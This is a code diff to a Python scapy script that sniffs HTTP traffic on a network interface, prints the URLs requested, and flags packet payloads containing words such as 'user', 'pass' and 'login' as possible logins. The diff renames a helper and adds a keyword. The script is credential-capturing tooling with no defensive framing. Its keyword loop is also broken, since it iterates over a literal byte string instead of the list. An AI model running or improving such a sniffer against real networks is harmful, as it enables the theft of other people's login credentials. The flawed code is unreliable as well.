@@ -14,13 +14,13 @@ def args():
 def sniff(iface):
     scapy.sniff(iface=iface, store=False, prn=sniffpacc)
 
-def gurl(pacc):
+def url(pacc):
     return pacc[http.HTTPRequest].Host + pacc[http.HTTPRequest].Path
 
 def login(pacc):
     if pacc.haslayer(scapy.Raw):
             load = pacc[scapy.Raw].load #add more fields and threads later
-            kywds = ['user', 'pass', 'name', 'mail,', 'word']
+            kywds = ['user', 'pass', 'name', 'mail,', 'word', 'login']
             for kywds in b'{kywds}':
                 if kywds in load:
                     return load
@@ -28,11 +28,9 @@ def login(pacc):
 
 def sniffpacc(pacc):
     if pacc.haslayer(http.HTTPRequest): #add https later just http for now 
-        url = gurl(pacc)
-        print(f'HTTP REQUEST: {url}')
-        load = login(pacc)
+        print(f'HTTP REQUEST: {url(pacc).decode()}')
         if login(pacc):
-            print(f'\n\nPOSSIBLE LOGIN FOUND: {load}\n\n') # FIX FOR NO RETURN
+            print(f'\n\nPOSSIBLE LOGIN FOUND: {login(pacc).decode()}\n\n')
 
         
                 
